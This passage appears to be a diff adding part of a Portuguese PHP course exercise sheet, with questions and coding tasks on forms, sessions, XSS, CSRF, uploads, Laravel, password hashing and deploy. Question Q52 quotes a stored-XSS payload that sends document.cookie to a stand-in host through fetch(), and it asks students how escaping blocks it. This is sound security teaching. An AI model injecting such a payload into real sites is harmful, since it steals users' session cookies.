+<li><span class="n">#35</span> Sessions e Cookies</li>
+<li><span class="n">#36</span> Upload de Arquivos</li>
+<li><span class="n">#37</span> Segurança em Formulários: XSS, CSRF e SQL Injection</li>
+<li><span class="n">#38</span> Composer e Namespaces</li>
+<li><span class="n">#39</span> PSR e Padrões de Código</li>
+<li><span class="n">#40</span> Boas Práticas e Código Limpo em PHP</li>
+</ul>
+<h3>Perguntas conceituais</h3>
+<div class="questao" id="q50">
+<span class="num">Q50</span>
+<div class="corpo">
+<p class="titulo">GET ou POST</p>
+<p>Quando um formulário deve usar <code>GET</code> e quando <code>POST</code>? Por que o formulário de busca do site usa <code>GET</code>, e o de login não pode usar?</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q51">
+<span class="num">Q51</span>
+<div class="corpo">
+<p class="titulo">Sessão e cookie</p>
+<p>Qual a diferença entre guardar o carrinho num <em>cookie</em> e na sessão (<code>$_SESSION</code>)? Que atributos um <em>cookie</em> de sessão deve ter, e por que chamar <code>session_regenerate_id(true)</code> no login?</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q52">
+<span class="num">Q52</span>
+<div class="corpo">
+<p class="titulo">XSS: escapar na saída</p>
+<p>Um comentário com <code>&lt;script&gt;fetch('https://mal.com?c='+document.cookie)&lt;/script&gt;</code> foi gravado no banco. Onde e como o PHP deve impedir que ele execute? Por que filtrar na entrada não basta?</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q53">
+<span class="num">Q53</span>
+<div class="corpo">
+<p class="titulo">PSR-12 e as outras PSRs</p>
+<p>O que é uma PSR, e qual a diferença de natureza entre a PSR-12 (estilo de código), a PSR-4 (<em>autoload</em>) e a PSR-7 (mensagens HTTP)?</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<h3>Exercícios de código</h3>
+<div class="questao" id="q54">
+<span class="num">Q54</span>
+<div class="corpo">
+<p class="titulo">Um formulário com CSRF e PRG</p>
+<p>Escreva <code>form.php</code>, servido pelo <code>php -S</code>, com um formulário de contato que: gera um <em>token</em> CSRF na sessão; no <code>POST</code>, recusa com 403 <em>token</em> ausente ou errado; valida o e-mail com <code>filter_var</code>; e, se tudo estiver certo, guarda uma mensagem de sucesso na sessão e redireciona com 303 (Post/Redirect/Get). Teste com <code>curl</code>, guardando os <em>cookies</em> num arquivo.</p>
+</div>
+</div>
+<div class="linhas" style="--n:12"></div>
+<div class="questao" id="q55">
+<span class="num">Q55</span>
+<div class="corpo">
+<p class="titulo">Upload seguro</p>
+<p>Escreva <code>upload.php</code> que receba um campo <code>capa</code> e só aceite imagens JPEG ou PNG de até 1 MB, verificando o <strong>conteúdo</strong> com <code>finfo</code> (e não a extensão nem o <code>type</code> enviado pelo navegador), confirmando com <code>getimagesize</code>, e gravando com um nome gerado pelo servidor fora da pasta pública. Teste com <code>curl -F</code> enviando uma imagem real, um PHP renomeado para <code>.png</code> e um arquivo grande.</p>
+</div>
+</div>
+<div class="linhas" style="--n:12"></div>
+<div class="questao" id="q56">
+<span class="num">Q56</span>
+<div class="corpo">
+<p class="titulo">Escapar conforme o contexto</p>
+<p>Escreva um programa que monte a mesma informação vinda do usuário (<code>O'Reilly &lt;b&gt;&amp;&lt;/b&gt; "Cia"</code>) em quatro contextos (o corpo do HTML, um atributo, uma URL e um bloco JSON dentro de um <code>&lt;script&gt;</code>), cada um com a função de escape certa, e mostre o resultado.</p>
+</div>
+</div>
+<div class="linhas" style="--n:12"></div>
+</section>
+<section class="modulo" id="modulo-8">
+<h2><span class="rotulo">MÓDULO 8</span> Laravel</h2>
+<p class="intro">Introdução ao Laravel, Eloquent, Blade, autenticação e autorização, e APIs.</p>
+<p class="aulas-titulo">Artigos 41 a 45</p>
+<ul class="aulas">
+<li><span class="n">#41</span> Introdução ao Laravel</li>
+<li><span class="n">#42</span> Eloquent ORM com Laravel</li>
+<li><span class="n">#43</span> Blade — Templates no Laravel</li>
+<li><span class="n">#44</span> Autenticação e Autorização no Laravel</li>
+<li><span class="n">#45</span> APIs com Laravel</li>
+</ul>
+<h3>Perguntas conceituais</h3>
+<div class="questao" id="q57">
+<span class="num">Q57</span>
+<div class="corpo">
+<p class="titulo">O que o Laravel faz por você</p>
+<p>Compare criar a livraria em PHP puro (como nos módulos anteriores) e em Laravel. Cite quatro coisas que o <em>framework</em> entrega prontas, e um custo de usá-lo.</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q58">
+<span class="num">Q58</span>
+<div class="corpo">
+<p class="titulo">Mass assignment</p>
+<p>O que é <em>mass assignment</em> no Eloquent, e por que <code>Livro::create($request-&gt;all())</code> é perigoso sem <code>$fillable</code>? Qual a forma recomendada?</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q59">
+<span class="num">Q59</span>
+<div class="corpo">
+<p class="titulo">Policies</p>
+<p>O editor pode alterar qualquer livro; o autor, só os próprios. Onde essa regra deve morar no Laravel, e por que não no <em>controller</em>?</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<h3>Exercícios de código</h3>
+<div class="questao" id="q60">
+<span class="num">Q60</span>
+<div class="corpo">
+<p class="titulo">Rotas, controller e validação no Laravel</p>
+<p>Escreva, para um projeto Laravel, a rota de recurso <code>livros</code>, o <code>StoreLivroRequest</code> com as regras (título obrigatório até 200 caracteres, ISBN único com 13 dígitos, preço numérico maior que zero) e o método <code>store</code> do <code>LivroController</code>, que cria o livro com os dados validados e redireciona para a página dele com uma mensagem.</p>
+</div>
+</div>
+<div class="linhas" style="--n:12"></div>
+<div class="questao" id="q61">
+<span class="num">Q61</span>
+<div class="corpo">
+<p class="titulo">Eloquent sem N+1</p>
+<p>Com os <em>models</em> <code>Autor</code> (hasMany <code>livros</code>) e <code>Livro</code> (belongsTo <code>autor</code>), escreva a consulta da página inicial: os 10 livros mais recentes com o nome do autor, sem o problema N+1; a lista de autores com a quantidade de livros de cada um, sem carregar os livros; e os autores que têm pelo menos um livro acima de R$ 100. Mostre como o Laravel pode <strong>proibir</strong> o <em>lazy loading</em> em desenvolvimento.</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+</section>
+<section class="modulo" id="modulo-9">
+<h2><span class="rotulo">MÓDULO 9</span> Segurança avançada, testes e produção</h2>
+<p class="intro">Segurança avançada, testes com PHPUnit e Pest, deploy e ambiente de produção, e desempenho.</p>
+<p class="aulas-titulo">Artigos 46 a 49</p>
+<ul class="aulas">
+<li><span class="n">#46</span> Segurança Avançada em PHP</li>
+<li><span class="n">#47</span> Testes Automatizados com PHPUnit e Pest</li>
+<li><span class="n">#48</span> Deploy e Ambiente de Produção</li>
+<li><span class="n">#49</span> Performance e Otimização</li>
+</ul>
+<h3>Perguntas conceituais</h3>
+<div class="questao" id="q62">
+<span class="num">Q62</span>
+<div class="corpo">
+<p class="titulo">Senhas</p>
+<p>Como guardar senhas em PHP? Por que <code>md5($senha)</code> e <code>sha256</code> com <em>salt</em> não servem, e o que <code>password_needs_rehash</code> resolve?</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q63">
+<span class="num">Q63</span>
+<div class="corpo">
+<p class="titulo">Cabeçalhos de segurança</p>
+<p>Cite quatro cabeçalhos HTTP de segurança que um site PHP deve enviar, e o que cada um impede.</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q64">
+<span class="num">Q64</span>
+<div class="corpo">
+<p class="titulo">OPcache e o preload</p>
+<p>O que o OPcache faz, e por que, em produção, <code>opcache.validate_timestamps=0</code> dá desempenho mas exige cuidado no deploy?</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q65">
+<span class="num">Q65</span>
+<div class="corpo">
+<p class="titulo">Deploy sem tempo fora do ar</p>
+<p>Descreva um deploy de uma aplicação PHP que não deixa o site fora do ar nem pela metade (código novo com dependências velhas). O que é a troca atômica de <em>symlink</em>?</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<h3>Exercícios de código</h3>
+<div class="questao" id="q66">
+<span class="num">Q66</span>
+<div class="corpo">
+<p class="titulo">Senhas com password_hash</p>
+<p>Escreva o fluxo de cadastro e login: gere o <em>hash</em> de uma senha com <code>PASSWORD_DEFAULT</code> e custo 10, mostre o formato do <em>hash</em>, verifique uma senha certa e uma errada, e use <code>password_needs_rehash</code> para migrar o <em>hash</em> quando o custo exigido sobe para 12.</p>
+</div>
+</div>
+<div class="linhas" style="--n:12"></div>
+<div class="questao" id="q67">
+<span class="num">Q67</span>
+<div class="corpo">
+<p class="titulo">Medindo o N+1</p>
+<p>Com SQLite em memória, crie 200 pedidos de 50 clientes e meça, com <code>hrtime</code>, duas formas de listar os pedidos com o nome do cliente: uma consulta para os pedidos e uma por pedido para o cliente (N+1), e uma consulta com <code>JOIN</code>. Mostre o número de consultas de cada forma e qual foi mais rápida.</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q68">
+<span class="num">Q68</span>
+<div class="corpo">
+<p class="titulo">Cabeçalhos de segurança num middleware</p>
+<p>Escreva uma função <code>comCabecalhosDeSeguranca(callable $controlador): callable</code> que envolva qualquer controlador e acrescente os cabeçalhos de segurança à resposta, e um <code>seguranca.php</code> que a use. Confira os cabeçalhos com <code>curl -I</code> pelo servidor embutido.</p>
+</div>
+</div>
+<div class="linhas" style="--n:12"></div>
+</section>
+<section class="modulo" id="modulo-10">
+<h2><span class="rotulo">MÓDULO 10</span> Projeto final</h2>
+<p class="intro">Planejamento e arquitetura, implementação, testes, deploy e encerramento.</p>
+<p class="aulas-titulo">Artigos 50 a 52</p>
+<ul class="aulas">
+<li><span class="n">#50</span> Projeto Final Parte 1: Planejamento e Arquitetura</li>
+<li><span class="n">#51</span> Projeto Final Parte 2: Implementação</li>
+<li><span class="n">#52</span> Projeto Final Parte 3: Testes, Deploy e Encerramento</li>
+</ul>
+<h3>Perguntas conceituais</h3>
+<div class="questao" id="q69">
+<span class="num">Q69</span>
+<div class="corpo">
+<p class="titulo">Do requisito ao plano</p>
+<p>Antes de escrever código do projeto final, que decisões o artigo #50 manda tomar e registrar? Por que escrever essas decisões, mesmo num projeto pessoal?</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+<div class="questao" id="q70">
+<span class="num">Q70</span>
+<div class="corpo">
+<p class="titulo">Uma lista de verificação antes do deploy</p>
+<p>Monte uma lista de verificação curta para colocar o projeto final em produção, cobrindo configuração, segurança, banco e operação.</p>
+</div>
+</div>
+<div class="linhas" style="--n:12"></div>
+<h3>Exercícios de código</h3>
+<div class="questao" id="q71">
+<span class="num">Q71</span>
+<div class="corpo">
+<p class="titulo">Um roteador mínimo</p>
+<p>O projeto final usa um roteador próprio, como este site. Escreva <code>final class Roteador</code> com <code>get</code> e <code>post</code> que aceitem padrões com parâmetros (<code>/livros/{id}</code>), convertidos para expressões regulares, e um <code>despachar(string $metodo, string $caminho)</code> que chame o controlador com os parâmetros nomeados, ou devolva 404 e 405 (método não permitido, com a lista dos aceitos). Mostre a importância da ordem das rotas com <code>/livros/novo</code> e <code>/livros/{id}</code>.</p>
+</div>
+</div>
+<div class="linhas" style="--n:5"></div>
+</section>
+<section class="modulo" id="desafios">
+<h2><span class="rotulo">PARA IR ALÉM</span> Desafios integradores</h2>
+<p class="intro">Projetos maiores, que juntam vários módulos. Não há uma única resposta certa: o gabarito mostra um caminho.</p>
+<div class="questao desafio" id="d1">
+<span class="num">D1</span>
+<div class="corpo">
+<p class="titulo">Uma calculadora, duas interfaces</p>
+<p>Escreva uma calculadora com sete operações: soma, subtração, multiplicação, divisão, potência (expoente inteiro), porcentagem (<code>15 % 200</code> é 15% de 200) e raiz quadrada (<code>raiz 2</code>). Ela deve: (a) aceitar vírgula ou ponto como separador decimal; (b) guardar o último resultado em <code>ans</code>, utilizável na conta seguinte; (c) recusar divisão por zero, raiz de negativo, expoente fracionário e texto que não é número com uma mensagem clara, <strong>sem encerrar o programa</strong>; (d) ter os comandos <code>hist</code> (histórico) e <code>sair</code> no terminal. O mesmo núcleo (<code>Calculadora.php</code>) deve servir a duas interfaces: um programa de terminal (<code>cli.php</code>) e uma página web (<code>web.php</code>), que guarda o <code>ans</code> e o histórico na sessão. Use a extensão <code>bcmath</code> para que <code>0,1 + 0,2</code> dê exatamente <code>0,3</code>.</p>
+</div>
+</div>
+<p><em>Sua solução (arquitetura, decisões e código principal):</em></p>
+<div class="linhas" style="--n:14"></div>
+<div class="questao desafio" id="d2">
+<span class="num">D2</span>
+<div class="corpo">
+<p class="titulo">Um mini-framework MVC</p>
+<p>Construa o esqueleto de um <em>framework</em> MVC como o deste site: um <em>front controller</em> (<code>public/index.php</code>), um roteador com parâmetros (o do módulo 10), um contêiner de injeção de dependências simples, <em>controllers</em> que recebem um objeto <code>Request</code> e devolvem um <code>Response</code>, <em>views</em> com escape automático, um <em>middleware</em> de CSRF e um repositório com PDO. Escreva uma página de listagem e uma de cadastro de livros, com testes de integração que façam requisições ao <em>front controller</em> sem servidor.</p>
+</div>
+</div>
+<p><em>Sua solução (arquitetura, decisões e código principal):</em></p>
+<div class="linhas" style="--n:14"></div>
+</section>
+<footer class="fim">
+<p><strong>Bom estudo e bons exercícios!</strong></p>
+<p>Dominando o PHP · <a href="https://theknowledgeisle.com/">theknowledgeisle.com</a></p>
+</footer>
+</body>
+</html>
